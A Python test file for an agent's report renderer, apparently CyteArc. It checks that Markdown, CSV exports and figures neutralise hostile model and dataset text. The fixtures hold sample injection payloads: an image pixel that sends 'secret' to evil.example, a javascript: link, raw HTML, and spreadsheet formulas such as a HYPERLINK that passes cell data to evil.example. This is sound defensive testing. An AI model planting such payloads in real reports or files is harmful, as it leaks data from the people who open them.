"""Derived Markdown, CSV and figures keep model and dataset text inert."""

import csv
import io
import re
import time
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import numpy as np
import pandas as pd
import pytest

from cytearc.agent.records import RunRecords
from cytearc.agent.rendering import annotation_csv, csv_cell, csv_frame
from cytearc.agent.report_text import markdown_text, narrative_html, normalize_narrative
from cytearc.agent.result import AnalysisRun
from cytearc.storage.artifacts import ArtifactRef

from .test_agent_report import _complete, _rich_records, _save_narrative
from .test_agent_result import _records

# Markdown that a viewer would fetch or follow if it stayed active.
_IMAGE = "![pixel](https://evil.example/exfil.png?d=secret)"
_LINK = "[click](javascript:alert(7))"
_REFERENCE = "[ref]: https://evil.example/reference"
_AUTOLINK = "<https://evil.example/auto>"
_HTML = '<img src="https://evil.example/tag.png">'
_PAYLOAD = "\n".join([_IMAGE, _LINK, _REFERENCE, _AUTOLINK, _HTML])

# Links and images the report writes itself.
_RENDERER_LINKS = (
    "[Nygen · nygen.io](https://www.nygen.io/)",
    "[Download annotations](annotations.csv)",
    "![Saved UMAP preview](umap_clusters.png)",
    "![Saved marker dotplot](marker_dotplot.png)",
    "![Cell counts by final cluster](cluster_sizes.svg)",
    "[Study and configuration](run.json)",
    "[Event history](events/)",
    "[Measured evidence](evidence/)",
    "[Model exchanges](calls/)",
    "[Annotations CSV](annotations.csv)",
    "[Markdown report](report.md)",
    "[CyteArc on GitHub](https://github.com/NygenAnalytics/CyteArc)",
)
_RENDERER_TARGETS = {
    re.search(r"\]\((.*)\)$", link)[1]  # type: ignore[index]
    for link in _RENDERER_LINKS
}


def _hostile_records(tmp_path: Path) -> RunRecords:
    """A report history whose every model and dataset string carries Markdown."""
    records = _rich_records(tmp_path)
    _save_narrative(records, "decision", _PAYLOAD)
    study = records.manifest["study"]
    study.update(context=_PAYLOAD, objective=_PAYLOAD, tissue=_IMAGE, organism=_LINK)
    records.append("inputsResolved", study=study, config=records.manifest["config"])
    prepared = records.read_json("evidence/prepared.json")
    prepared["designDiagnostics"] = {
        "crossTabs": [
            {
                "leftColumn": "donor",
                "rightColumn": _IMAGE,
                "counts": [{"left": _IMAGE, "right": _LINK, "count": 3}],
                "rowsMissing": 0,
            }
        ]
    }
    prepared["resolvedRoles"] = [
        {"column": _LINK, "role": "protected", "source": "inferred"}
    ]
    _complete(records, "preprocess", "hostile-prepared", prepared)
    assessed = records.read_json("evidence/assessed.json")
    finalist = assessed["finalists"]["c0:r0.5"]
    finalist["clusters"][0]["markers"] = [
        {"gene": _IMAGE, "score": 0.9, "fracExp": 0.7},
        {"gene": _LINK, "score": 0.8, "fracExp": 0.6},
    ]
    _complete(records, "finalists", "hostile-assessed", assessed)
    annotated = records.read_json("evidence/annotate.json")
    annotated["annotations"][0].update(
        identity=_IMAGE, rationale=_PAYLOAD, supportingMarkers=[_IMAGE, _LINK]
    )
    _complete(records, "annotate", "hostile-annotations", annotated)
    records.append("limitation", message=_PAYLOAD)
    records.append(
        "status",
        status="needsInput",
        stage="annotate",
        questions=[{"questionId": "hostile", "question": _PAYLOAD}],
    )
    return records


def test_markdown_report_keeps_model_and_dataset_links_and_images_inert(
    tmp_path: Path,
) -> None:
    records = _hostile_records(tmp_path)
    AnalysisRun(records.path).report()
    markdown = (records.path / "report.md").read_text()
    remaining = markdown
    for link in _RENDERER_LINKS:
        remaining = remaining.replace(link, "")
    # Without an unescaped bracket no link, image or reference definition forms.
    assert re.search(r"(?<!\\)[\[\]]", remaining) is None
    assert "<img" not in markdown and "<https:" not in markdown
    assert r"!\[pixel\](https://evil.example/exfil.png?d=secret)" in markdown
    assert r"\[click\](javascript:alert(7))" in markdown
    markdown_it = pytest.importorskip("markdown_it")
    parser = markdown_it.MarkdownIt("commonmark").enable("table")
    targets = set()
    for token in parser.parse(markdown):
        assert token.type not in {"html_block", "html_inline"}
        for child in token.children or []:
            assert child.type not in {"html_inline", "html_block"}
            if child.type in {"link_open", "image"}:
                targets.add(str(child.attrs.get("href") or child.attrs.get("src")))
    assert targets <= _RENDERER_TARGETS
    assert "annotations.csv" in targets


def test_markdown_text_escapes_delimiters_and_rules_but_keeps_lists() -> None:
    assert markdown_text(r"a_b *c* [d](e) `f` \ | # ~ <g> & \"h\"") == (
        r"a\_b \*c\* \[d\](e) \`f\` \\ \| \# \~ &lt;g&gt; &amp; \\&quot;h\\&quot;"
    )
    # A line of dashes or equals signs would otherwise end the paragraph as a
    # thematic break or a heading underline.
    assert markdown_text("Title\n===\n - - -\n- item") == (
        "Title\n\\===\n \\- - -\n- item"
    )


def test_marker_dotplot_draws_gene_names_as_literal_text() -> None:
    from matplotlib import pyplot as plt

    from cytearc.agent.plots import marker_dotplot

    from .test_agent_plots import _Run, _Store, _table

    store, run = _Store(), _Run()
    names = ["$x^$", r"$\alpha$", "price $5"]
    for group in ("1", "2", "10"):
        store.tables[group] = _table(
            group,
            [
                (index, name, 0.9 - index / 10, 1.0 + index, 0.8)
                for index, name in enumerate(names, start=2)
            ],
        )
    result = marker_dotplot(store, run, top_n=3, max_genes=3)
    try:
        axis = result.axes["markers"]
        labels = axis.get_xticklabels()
        assert [label.get_text() for label in labels] == names
        assert not any(label.get_parse_math() for label in labels)
        # Saving draws every text after the plotting context has closed.
        result.figure.savefig(io.BytesIO(), format="png")
    finally:
        result.close()
    assert not plt.fignum_exists(result.figure.number)


_FORMULAS = ["=1+1", "+cmd", "-2+3", "@SUM(A1)", "\tTab", "\rReturn", "\nFeed"]


def test_csv_cells_that_start_a_formula_are_quoted() -> None:
    assert [csv_cell(value) for value in _FORMULAS] == [
        "'" + value for value in _FORMULAS
    ]
    assert [csv_cell(value) for value in ("cell-1", "T cells", "", None, -0.5, 3)] == [
        "cell-1",
        "T cells",
        "",
        None,
        -0.5,
        3,
    ]
    rows = [
        {
            "clusterId": "-1",
            "identity": '=HYPERLINK("https://evil.example/?"&A1,"x")',
            "confidence": "low",
            "supportingMarkers": ["=GENE"],
            "contradictingMarkers": [],
            "rationale": "@SUM(A1)",
        }
    ]
    saved = list(csv.DictReader(io.StringIO(annotation_csv(rows))))
    assert saved == [
        {
            "clusterId": "'-1",
            "identity": '\'=HYPERLINK("https://evil.example/?"&A1,"x")',
            "confidence": "low",
            "supportingMarkers": '["=GENE"]',
            "contradictingMarkers": "[]",
            "rationale": "'@SUM(A1)",
        }
    ]


def test_csv_frame_quotes_text_columns_and_keeps_numbers_numeric() -> None:
    frame = pd.DataFrame(
        {
            "name": ["=1+1", "plain", None],
            "label": pd.Categorical(["@a", "b", "@a"]),
            "score": [-0.5, 1.0, np.nan],
            "count": [-3, 4, 5],
            "flag": [True, False, True],
        }
    )
    safe = csv_frame(frame)
    assert safe["name"].tolist()[:2] == ["'=1+1", "plain"]
    assert pd.isna(safe["name"].iloc[2])
    assert [str(value) for value in safe["label"]] == ["'@a", "b", "'@a"]
    pd.testing.assert_frame_equal(
        safe[["score", "count", "flag"]], frame[["score", "count", "flag"]]
    )
    assert frame["name"].tolist()[0] == "=1+1"


def test_reports_and_exports_never_write_spreadsheet_formulas(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import cytearc.agent.evidence as evidence

    records = _records(tmp_path)
    annotated = records.read_json("evidence/annotate.json")
    annotated["annotations"][0].update(
        identity='=HYPERLINK("https://evil.example","x")', rationale="+cmd"
    )
    _complete(records, "annotate", "formula-annotations", annotated)
    saved = records.read_json("evidence/finalize.json")
    frame = pd.DataFrame(
        {
            "ids": ["=1+1", "@cell", "cell-B"],
            "clusters": [2, 1, 1],
            "umap_1": [-9.0, 3.0, 1.0],
            "umap_2": [2.0, -4.0, 6.0],
        }
    )
    run = SimpleNamespace(
        run_id="fixed-final",
        status="completed",
        cells=SimpleNamespace(to_pandas_dataframe=lambda names: frame[names].copy()),
        refs={
            key: ArtifactRef.from_dict(ref) for key, ref in saved["artifacts"].items()
        },
    )
    markers = pd.DataFrame(
        {
            "group_id": ["1", "2"],
            "feature_name": ["=CMD()", "\tGENE"],
            "score": [-0.5, 0.9],
            "fold_change": [np.inf, np.nan],
        }
    )
    store = SimpleNamespace(
        pipeline=SimpleNamespace(open=lambda run_id: _Run(run)),
        artifacts=SimpleNamespace(inspect=lambda ref: SimpleNamespace(complete=True)),
        markers=SimpleNamespace(load=lambda **kwargs: markers.copy()),
    )
    monkeypatch.setattr(evidence, "verify_source", lambda *args: None)
    monkeypatch.setattr(evidence, "open_store", lambda *args, **kwargs: store)
    result = AnalysisRun(records.path)
    result.report()
    output = result.export(tmp_path / "export")
    for directory in (records.path, output):
        rows = list(
            csv.DictReader(io.StringIO((directory / "annotations.csv").read_text()))
        )
        assert rows[0]["identity"] == '\'=HYPERLINK("https://evil.example","x")'
        assert rows[0]["rationale"] == "'+cmd"
    clusters = pd.read_csv(output / "clusters.csv")
    assert clusters["ids"].tolist() == ["'=1+1", "'@cell", "cell-B"]
    umap = pd.read_csv(output / "umap.csv")
    assert umap["umap_1"].tolist() == [-9.0, 3.0, 1.0]
    exported = pd.read_csv(output / "markers.csv")
    assert exported["feature_name"].tolist() == ["'=CMD()", "'\tGENE"]
    assert exported["score"].tolist() == [-0.5, 0.9]
    assert exported["fold_change"].iloc[0] == np.inf
    assert np.isnan(exported["fold_change"].iloc[1])


class _Run(dict[str, ArtifactRef]):
    def __init__(self, run: Any) -> None:
        super().__init__(run.refs)
        self.run_id = run.run_id
        self.status = run.status
        self.cells = run.cells


@pytest.mark.parametrize(
    "text",
    [
        "`" * 4000,
        "`" * 2000 + "x" + "`" * 1999,
        ("`" * 17 + "x") * 222,
        "".join("`" * length + "x" for length in range(88, 0, -1)),
        "".join("`" * length + "x" for length in range(1, 89)),
    ],
    ids=["run", "unequal-runs", "repeated-17", "decreasing", "increasing"],
)
def test_backtick_runs_render_in_linear_time(text: str) -> None:
    start = time.perf_counter()
    narrative_html(text)
    normalize_narrative(text)
    markdown_text(normalize_narrative(text))
    # The unbounded delimiter took about five seconds for 4,000 backticks.
    assert time.perf_counter() - start < 0.5


def test_bounded_backtick_delimiters_still_mark_inline_code() -> None:
    assert narrative_html("Keep `GENE_A_B` and ``a`b`` literal.") == (
        "<p>Keep <code>GENE_A_B</code> and <code>a`b</code> literal.</p>"
    )
    assert narrative_html("An unmatched `backtick stays.") == (
        "<p>An unmatched `backtick stays.</p>"
    )
